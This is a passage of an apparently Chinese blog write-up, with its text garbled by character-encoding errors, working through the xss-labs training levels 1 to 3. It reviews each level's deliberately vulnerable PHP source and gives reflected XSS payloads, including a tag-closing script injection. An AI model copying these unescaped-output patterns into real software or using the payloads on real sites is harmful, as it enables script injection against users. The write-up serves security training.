class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·"</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h2&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level1.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>è¿™æ®µä»£ç é‡å†™äº† <code>window.alert</code> å‡½æ•°ï¼Œå½“è°ƒç”¨ <code>alert</code> æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªç¡®è®¤æ¡†ï¼Œå¹¶è·³è½¬åˆ° <code>level2.php?keyword=test</code>ã€‚</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¿™æ®µä»£ç æ¥æ”¶ç”¨æˆ·çš„GETè¯·æ±‚å‚æ•°ï¼Œç„¶åç›´æ¥æ‹¼æ¥è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œå¯¼è‡´å­˜åœ¨æ³¨å…¥jsä»£ç çš„å¯èƒ½ã€‚</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·"</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h2&gt;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> è¿™æ®µä»£ç çš„ä½œç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»£ç è§£é‡Š</p><ul><li>**<code>&lt;meta&gt;</code>**ï¼šHTMLä¸­çš„<code>&lt;meta&gt;</code>æ ‡ç­¾ç”¨äºå®šä¹‰æ–‡æ¡£çš„å…ƒæ•°æ®ï¼Œè¿™äº›å…ƒæ•°æ®ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½†ä¼šè¢«æµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰æˆ–æœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ç­‰ä½¿ç”¨ã€‚</li><li>**<code>http-equiv="content-type"</code>**ï¼šè¿™ä¸ªå±æ€§ç”¨äºæŒ‡å®šæ–‡æ¡£çš„MIMEç±»å‹å’Œå­—ç¬¦ç¼–ç ã€‚<code>content-type</code>æ˜¯HTTPå¤´éƒ¨å­—æ®µï¼Œç”¨äºå‘Šè¯‰æµè§ˆå™¨æ–‡æ¡£çš„ç±»å‹å’Œå­—ç¬¦ç¼–ç æ–¹å¼ã€‚</li><li>**<code>content="text/html;charset=utf-8"</code>**ï¼š<ul><li><code>text/html</code>ï¼šæŒ‡å®šæ–‡æ¡£çš„ç±»å‹ä¸ºHTMLã€‚</li><li><code>charset=utf-8</code>ï¼šæŒ‡å®šæ–‡æ¡£çš„å­—ç¬¦ç¼–ç ä¸ºUTF-8ã€‚UTF-8æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼Œå¯ä»¥æ”¯æŒå¤šç§è¯­è¨€çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸­æ–‡ã€è‹±æ–‡ç­‰ã€‚</li></ul></li></ul><p>ä½œç”¨æ€»ç»“</p><p>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯å‘Šè¯‰æµè§ˆå™¨ï¼š</p><ol><li>è¿™æ˜¯ä¸€ä¸ªHTMLæ–‡æ¡£ã€‚</li><li>æ–‡æ¡£çš„å­—ç¬¦ç¼–ç æ˜¯UTF-8ã€‚</li></ol><p>ä½¿ç”¨UTF-8ç¼–ç å¯ä»¥ç¡®ä¿æ–‡æ¡£ä¸­çš„å­—ç¬¦ï¼ˆå°¤å…¶æ˜¯éè‹±æ–‡å­—ç¬¦ï¼‰èƒ½å¤Ÿæ­£ç¡®æ˜¾ç¤ºï¼Œé¿å…å‡ºç°ä¹±ç é—®é¢˜ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸€å…³æ˜¯æœ€åŸºç¡€çš„åå°„å‹xssï¼ŒæœåŠ¡ç«¯å°†ç”¨æˆ·çš„GETè¯·æ±‚å‚æ•°ç›´æ¥è¿›è¡Œæ‹¼æ¥ç„¶åè¾“å‡ºã€‚</p><h1 id="äºŒã€level-02-ï¼ˆæ ‡ç­¾é—­åˆè§¦å‘xssä»£ç ï¼‰"><a href="#äºŒã€level-02-ï¼ˆæ ‡ç­¾é—­åˆè§¦å‘xssä»£ç ï¼‰" class="headerlink" title="äºŒã€level-02 *ï¼ˆæ ‡ç­¾é—­åˆè§¦å‘xssä»£ç ï¼‰"></a>äºŒã€level-02 *ï¼ˆæ ‡ç­¾é—­åˆè§¦å‘xssä»£ç ï¼‰</h1><h2 id="2-1-é¢˜é¢-1"><a href="#2-1-é¢˜é¢-1" class="headerlink" title="2.1 é¢˜é¢"></a>2.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.41.11.png" style="zoom:30%;"><h2 id="2-2-è§£é¢˜-1"><a href="#2-2-è§£é¢˜-1" class="headerlink" title="2.2 è§£é¢˜"></a>2.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤ä¸å›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.42.18.png" style="zoom:40%;"><p>åœ¨æœç´¢æ¡†è¾“å…¥å†…å®¹ï¼Œä¼šè¢«å½“ä½œGETè¯·æ±‚çš„keywordå‚æ•°ä¼ é€’ç»™æœåŠ¡å™¨ï¼Œç„¶åkeywordçš„å€¼ä¼šå›æ˜¾åˆ°é¡µé¢ä¸­ã€‚</p><ul><li>åŸºç¡€POCå°è¯•</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.45.10.png" style="zoom:40%;"><p>jsè„šæœ¬æ‰§è¡Œå¤±è´¥ï¼Œå¼¹çª—å¤±è´¥ã€‚POCå®Œæ•´çš„æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šäº†ï¼Œä½†æ˜¯æ²¡æœ‰è¢«å½“ä½œè„šæœ¬æ‰§è¡Œã€‚</p><ul><li>æŸ¥çœ‹ç½‘é¡µæºä»£ç </li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.48.04.png" style="zoom:50%;"><p>å‘ç°<code>&lt;å’Œ&gt;</code>è¢«è½¬åŒ–æˆäº†htmlç¼–ç ï¼Œæ‰€ä»¥æµè§ˆå™¨æ— æ³•æ‰§è¡Œjsè„šæœ¬ã€‚ã€æ­¤å¤„ä¸€å®šè¦æ³¨æ„ï¼Œæ˜¯å¦è¿˜æœ‰å…¶ä»–åœ°æ–¹å­˜åœ¨æäº¤çš„Pocï¼Ÿã€‘</p><p>å…¶ä»–çš„pocä¹Ÿç±»ä¼¼ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.53.59.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.54.39.png" style="zoom:50%;"><ul><li>å°è¯•å¯¹<code>&lt;&gt;</code>è¿›è¡Œhtmlç¼–ç </li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2014.57.04.png" style="zoom:50%;"><p>æ²¡ç”¨ã€‚</p><ul><li>å°è¯•å…¶ä»–ç»•è¿‡æ–¹æ³•</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;&lt;</span> <span class="token operator">&gt;&gt;</span> æ²¡ç”¨ <span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span>æ²¡ç”¨<span class="token operator">&amp;</span><span class="token comment">#x3c; //HTML å®ä½“ç¼–ç ï¼Œ16è¿›åˆ¶ æ²¡ç”¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-3-ä»£ç å®¡è®¡-1"><a href="#2-3-ä»£ç å®¡è®¡-1" class="headerlink" title="2.3 ä»£ç å®¡è®¡"></a>2.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--STATUS OK--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"å®Œæˆçš„ä¸é”™ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level3.php?writing=wait"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value="æœç´¢"/&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level2.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€å…³ä¸åŒä¹‹å¤„åœ¨ç”¨<code>htmlspecialchars</code>å‡½æ•°å¯¹GETè·å–çš„keywordå€¼è¿›è¡Œäº†å¤„ç†ã€‚</p><blockquote><h4 id="htmlspecialchars-å‡½æ•°"><a href="#htmlspecialchars-å‡½æ•°" class="headerlink" title="`htmlspecialchars()å‡½æ•°"></a>`htmlspecialchars()å‡½æ•°</h4><p><code>htmlspecialchars</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ PHP å‡½æ•°ï¼Œä¸»è¦ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚å®ƒçš„ä½œç”¨æ˜¯é˜²æ­¢ XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ”»å‡»ï¼Œç¡®ä¿è¾“å‡ºçš„å†…å®¹æ˜¯å®‰å…¨çš„ã€‚</p><p>1ã€å‡½æ•°å®šä¹‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">string</span> <span class="token function">htmlspecialchars</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$string</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name">ENT_COMPAT</span> <span class="token operator">|</span> <span class="token class-name">ENT_HTML401</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$encoding</span> <span class="token operator">=</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"default_charset"</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$double_encode</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ã€å‚æ•°è¯´æ˜</p><ul><li>**<code>$string</code>**ï¼šéœ€è¦è½¬æ¢çš„å­—ç¬¦ä¸²ã€‚</li><li>**<code>$flags</code>**ï¼šå¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè½¬æ¢çš„è§„åˆ™ã€‚é»˜è®¤å€¼æ˜¯ <code>ENT_COMPAT | ENT_HTML401</code>ã€‚<ul><li><code>ENT_COMPAT</code>ï¼šå°†åŒå¼•å·ï¼ˆ<code>"</code>ï¼‰è½¬æ¢ä¸º HTML å®ä½“ï¼Œä½†ä¸è½¬æ¢å•å¼•å·ï¼ˆ<code>'</code>ï¼‰ã€‚</li><li><code>ENT_QUOTES</code>ï¼šå°†åŒå¼•å·ï¼ˆ<code>"</code>ï¼‰å’Œå•å¼•å·ï¼ˆ<code>'</code>ï¼‰éƒ½è½¬æ¢ä¸º HTML å®ä½“ã€‚</li><li><code>ENT_NOQUOTES</code>ï¼šä¸è½¬æ¢ä»»ä½•å¼•å·ã€‚</li><li><code>ENT_HTML401</code>ï¼šä½¿ç”¨ HTML 4.01 è§„èŒƒã€‚</li><li><code>ENT_HTML5</code>ï¼šä½¿ç”¨ HTML 5 è§„èŒƒã€‚</li><li><code>ENT_SUBSTITUTE</code>ï¼šå¦‚æœé‡åˆ°æ— æ•ˆçš„ç¼–ç ï¼Œç”¨ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦æ›¿ä»£ã€‚</li><li><code>ENT_DISALLOWED</code>ï¼šå°†ä¸è¢«å…è®¸çš„å­—ç¬¦æ ‡è®°ä¸ºæ— æ•ˆã€‚</li></ul></li><li>**<code>$encoding</code>**ï¼šå¯é€‰å‚æ•°ï¼ŒæŒ‡å®šå­—ç¬¦ç¼–ç ã€‚é»˜è®¤å€¼æ˜¯ <code>ini_get("default_charset")</code>ï¼Œé€šå¸¸ä¸º <code>UTF-8</code>ã€‚</li><li>**<code>$double_encode</code>**ï¼šå¯é€‰å‚æ•°ï¼Œå¸ƒå°”å€¼ã€‚å¦‚æœè®¾ç½®ä¸º <code>true</code>ï¼Œåˆ™ä¼šå°†å·²ç¼–ç çš„ HTML å®ä½“å†æ¬¡ç¼–ç ï¼›å¦‚æœè®¾ç½®ä¸º <code>false</code>ï¼Œåˆ™ä¸ä¼šå¯¹å·²ç¼–ç çš„å®ä½“è¿›è¡Œé‡å¤ç¼–ç ã€‚</li></ul><p>3ã€è¿”å›å€¼</p><p>â€‹è¿”å›è½¬æ¢åçš„å­—ç¬¦ä¸²ã€‚</p><p>4ã€ç¤ºä¾‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;a href='test'&gt;Test&lt;/a&gt; &amp; 'test'"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¾“å‡ºï¼š&amp;lt;a href=&amp;#039;test&amp;#039;&amp;gt;Test&amp;lt;/a&amp;gt; &amp;amp; &amp;#039;test&amp;#039;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>è¿™ä¸€å…³htmlspecialcharså‡½æ•°çš„flagså‚æ•°ä½¿ç”¨çš„æ˜¯é»˜è®¤å€¼ã€‚</p><p>å½“ <code>$flags = ENT_COMPAT | ENT_HTML401</code> æ—¶ï¼Œ<code>htmlspecialchars</code> å‡½æ•°ä¼šå°†ä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼š</p><ul><li><code>&amp;</code>ï¼ˆå’Œå·ï¼‰ä¼šè½¬æ¢ä¸º <code>&amp;</code></li><li><code>"</code>ï¼ˆåŒå¼•å·ï¼‰ä¼šè½¬æ¢ä¸º <code>"</code></li><li><code>&lt;</code>ï¼ˆå°äºå·ï¼‰ä¼šè½¬æ¢ä¸º <code>&lt;</code></li><li><code>&gt;</code>ï¼ˆå¤§äºå·ï¼‰ä¼šè½¬æ¢ä¸º <code>&gt;</code></li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>ENT_COMPAT</code> è¡¨ç¤ºä»…å¯¹åŒå¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸ä¼šè½¬ä¹‰å•å¼•å·ã€‚</p><p>å†ä»”ç»†åˆ†æç½‘é¡µæºä»£ç å’Œè¿™ä¸€å…³çš„æºä»£ç ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.24.29.png" style="zoom:50%;"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value="æœç´¢"/&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶h2æ ‡ç­¾å¤„ä½¿ç”¨äº†htmlspecialcharså‡½æ•°è¿›è¡Œç¼–ç ï¼Œä½†æ˜¯inputæ ‡ç­¾å•Šçš„valueå€¼è¿˜æ˜¯ç”¨åŸå§‹å€¼æ‹¼æ¥çš„ã€‚</p><p>é‚£ä¹ˆæ„é€ å¦‚ä¸‹çš„payloadï¼Œé—­åˆinputæ ‡ç­¾ç„¶åæ’å…¥jsä»£ç ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token string double-quoted-string">"&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.28.44.png" style="zoom:50%;"><p>æŠ“åŒ…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ’å…¥çš„æ¶æ„ä»£ç è¢«æˆåŠŸæ¸²æŸ“å¹¶æ‰§è¡Œï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-06%2015.30.35.png" style="zoom:50%;"><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬å…³æœ‰ä¸€ä¸ªç‰¹æ®Šçš„å‘ï¼Œå­˜åœ¨ä¸¤å¤„æ‹¼æ¥å¤„ç†GETå‚æ•°çš„ä½ç½®ï¼Œä¸€å¤„ä½¿ç”¨htmlspecialcharsè¿›è¡Œäº†ç¼–ç ï¼Œå¦ä¸€å¤„æ²¡æœ‰ã€‚è§‚å¯Ÿè¦ä»”ç»†ä¸”å…¨é¢ï¼Œå¯¹äºæ²¡æœ‰ä½¿ç”¨htmlspecialcharså‡½æ•°ç¼–ç çš„ä½ç½®è¿›è¡Œé‡ç‚¹æ”»å‡»ã€‚</p><h1 id="ä¸‰ã€level-03-ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰"><a href="#ä¸‰ã€level-03-ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰" class="headerlink" title="ä¸‰ã€level-03 *ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰"></a>ä¸‰ã€level-03 *ï¼ˆåŸºäºäº‹ä»¶å±æ€§è§¦å‘xssä»£ç ï¼‰</h1><h2 id="3-1-é¢˜é¢"><a href="#3-1-é¢˜é¢" class="headerlink" title="3.1 é¢˜é¢"></a>3.1 é¢˜é¢</h2><img 